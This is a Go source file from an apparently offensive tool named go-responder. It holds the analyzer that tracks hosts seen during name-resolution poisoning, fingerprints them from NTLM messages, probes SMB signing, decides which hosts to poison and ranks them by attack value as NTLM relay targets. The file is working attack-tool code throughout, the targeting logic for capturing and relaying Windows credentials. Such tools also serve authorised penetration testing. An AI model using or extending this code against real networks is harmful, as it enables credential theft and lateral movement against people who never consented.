package analyzer

import (
	"fmt"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"go-responder/internal/core"
)

// SigningStatus describes the SMB signing posture of a host.
type SigningStatus int

const (
	SigningUnknown     SigningStatus = iota
	SigningNotRequired              // no signing at all  — relay target
	SigningEnabled                  // supported but not required — relay target
	SigningRequired                 // required — relay blocked
)

func (s SigningStatus) String() string {
	switch s {
	case SigningNotRequired:
		return "not-required"
	case SigningEnabled:
		return "enabled"
	case SigningRequired:
		return "required"
	default:
		return "unknown"
	}
}

// HostInfo holds everything we learn about one observed host.
type HostInfo struct {
	IP            net.IP
	Hostname      string
	Domain        string
	OSVersion     string
	Signing       SigningStatus
	SigningProbed bool
	IsDC          bool
	QueryCount    int
	Queries       []string
	FirstSeen     time.Time
	LastSeen      time.Time
	mu            sync.Mutex
}

// IsRelayTarget reports whether this host can be used as an SMB relay target.
func (h *HostInfo) IsRelayTarget() bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.SigningProbed && h.Signing != SigningRequired
}

// NetworkMap is the thread-safe in-memory network fingerprint store.
type NetworkMap struct {
	hosts   map[string]*HostInfo
	mu      sync.RWMutex
	probing sync.Map // IP string -> bool, used as a TryLock per host
}

// Global is the singleton NetworkMap populated by all poisoner and server goroutines.
var Global = &NetworkMap{hosts: make(map[string]*HostInfo)}

func (nm *NetworkMap) getOrCreate(ip net.IP) *HostInfo {
	key := ip.String()
	nm.mu.Lock()
	h, ok := nm.hosts[key]
	if !ok {
		h = &HostInfo{IP: ip, FirstSeen: time.Now()}
		nm.hosts[key] = h
	}
	nm.mu.Unlock()
	return h
}

// RegisterQuery records a multicast name query broadcast by ip.
func (nm *NetworkMap) RegisterQuery(ip net.IP, name string) {
	h := nm.getOrCreate(ip)
	h.mu.Lock()
	h.LastSeen = time.Now()
	h.QueryCount++
	if name != "" {
		h.Queries = append(h.Queries, name)
	}
	// Queries for DC-related names reveal the host is a DC or is talking to one.
	upper := strings.ToUpper(name)
	if strings.Contains(upper, "_LDAP._TCP") || strings.Contains(upper, "_KERBEROS") {
		h.IsDC = true
	}
	h.mu.Unlock()

	go nm.probeSigningOnce(ip)
}

// RegisterNTLMNegotiate extracts host metadata from an NTLM Type 1 message.
func (nm *NetworkMap) RegisterNTLMNegotiate(ip net.IP, workstation, domain, osVer string) {
	h := nm.getOrCreate(ip)
	h.mu.Lock()
	if workstation != "" && h.Hostname == "" {
		h.Hostname = workstation
	}
	if domain != "" && h.Domain == "" {
		h.Domain = domain
	}
	if osVer != "" && h.OSVersion == "" {
		h.OSVersion = osVer
	}
	h.LastSeen = time.Now()
	h.mu.Unlock()
	if workstation != "" || domain != "" || osVer != "" {
		core.LogInfo("[Analyzer] fingerprinted %s hostname=%q domain=%q os=%q",
			ip, workstation, domain, osVer)
	}
}

// ShouldPoison returns true when selective mode should allow sending a poisoned
// response to ip. Always returns true when selective mode is disabled.
func (nm *NetworkMap) ShouldPoison(ip net.IP) bool {
	if !core.SelectiveMode {
		return true
	}
	// With a fixed relay target any host is a potential victim regardless of
	// its own signing posture — we relay its auth to the fixed destination.
	if core.RelayMode && core.RelayHasFixedTargets {
		return true
	}
	key := ip.String()
	nm.mu.RLock()
	h, ok := nm.hosts[key]
	nm.mu.RUnlock()
	if !ok {
		return true // unknown host — poison to fingerprint it
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	if !h.SigningProbed {
		return true // not yet probed — still worth poisoning
	}
	// In selective mode without a fixed relay target: skip signing=required hosts
	// unless they are DCs (high value for capture even without relay).
	return h.Signing != SigningRequired || h.IsDC
}

// BestRelayTarget returns the highest-scored host suitable for NTLM relay,
// excluding skipIP (the victim — we never relay back to the attacker).
// Returns nil when no relay target is known yet.
func (nm *NetworkMap) BestRelayTarget(skipIP net.IP) net.IP {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	var best *HostInfo
	for _, h := range nm.hosts {
		if skipIP != nil && h.IP.Equal(skipIP) {
			continue
		}
		if !h.IsRelayTarget() {
			continue
		}
		if best == nil || scoreHost(h) > scoreHost(best) {
			best = h
		}
	}
	if best == nil {
		return nil
	}
	return best.IP
}

// RelayTargets returns every IP currently classified as a relay target.
func (nm *NetworkMap) RelayTargets() []net.IP {
	nm.mu.RLock()
	defer nm.mu.RUnlock()
	var out []net.IP
	for _, h := range nm.hosts {
		if h.IsRelayTarget() {
			out = append(out, h.IP)
		}
	}
	return out
}

// probeSigningOnce probes SMB signing on ip at most once, skipping concurrent
// or already-completed probes.
func (nm *NetworkMap) probeSigningOnce(ip net.IP) {
	key := ip.String()
	if _, loaded := nm.probing.LoadOrStore(key, true); loaded {
		return
	}
	defer nm.probing.Delete(key)

	nm.mu.RLock()
	h, ok := nm.hosts[key]
	nm.mu.RUnlock()
	if ok {
		h.mu.Lock()
		done := h.SigningProbed
		h.mu.Unlock()
		if done {
			return
		}
	}

	signing := ProbeSMBSigning(ip)

	h = nm.getOrCreate(ip)
	h.mu.Lock()
	h.Signing = signing
	h.SigningProbed = true
	relayTag := ""
	if signing != SigningRequired {
		relayTag = " <<< RELAY TARGET"
	}
	h.mu.Unlock()
	core.LogInfo("[Analyzer] %s SMB signing=%s%s", ip, signing, relayTag)
}

// RankedHosts returns all discovered hosts sorted by attack value, highest first.
func (nm *NetworkMap) RankedHosts() []*HostInfo {
	nm.mu.RLock()
	list := make([]*HostInfo, 0, len(nm.hosts))
	for _, h := range nm.hosts {
		list = append(list, h)
	}
	nm.mu.RUnlock()
	sort.Slice(list, func(i, j int) bool {
		return scoreHost(list[i]) > scoreHost(list[j])
	})
	return list
}

// PrintMap logs the current network fingerprint table.
func (nm *NetworkMap) PrintMap() {
	hosts := nm.RankedHosts()
	if len(hosts) == 0 {
		core.LogInfo("[Analyzer] No hosts discovered yet")
		return
	}
	sep := strings.Repeat("-", 110)
	core.LogInfo("[Analyzer] ========== Network Map (%d hosts) ==========", len(hosts))
	core.LogInfo("[Analyzer] %-18s %-20s %-18s %-24s %-15s %s",
		"IP", "Hostname", "Domain", "OS", "SMB Signing", "Queries")
	core.LogInfo("[Analyzer] %s", sep)
	for _, h := range hosts {
		h.mu.Lock()
		signing := "probing..."
		if h.SigningProbed {
			signing = h.Signing.String()
		}
		label := h.IP.String()
		if h.IsDC {
			label += " [DC]"
		}
		core.LogInfo("[Analyzer] %-18s %-20s %-18s %-24s %-15s %d (%s)",
			label, h.Hostname, h.Domain, h.OSVersion, signing, h.QueryCount,
			fmt.Sprintf("%v", h.Queries))
		h.mu.Unlock()
	}
	core.LogInfo("[Analyzer] %s", sep)
}

func scoreHost(h *HostInfo) int {
	h.mu.Lock()
	defer h.mu.Unlock()
	score := 0
	switch h.Signing {
	case SigningNotRequired:
		score += 300 // best relay target
	case SigningEnabled:
		score += 200 // relay target
	}
	if h.IsDC {
		score += 100
	}
	score += h.QueryCount * 3
	return score
}
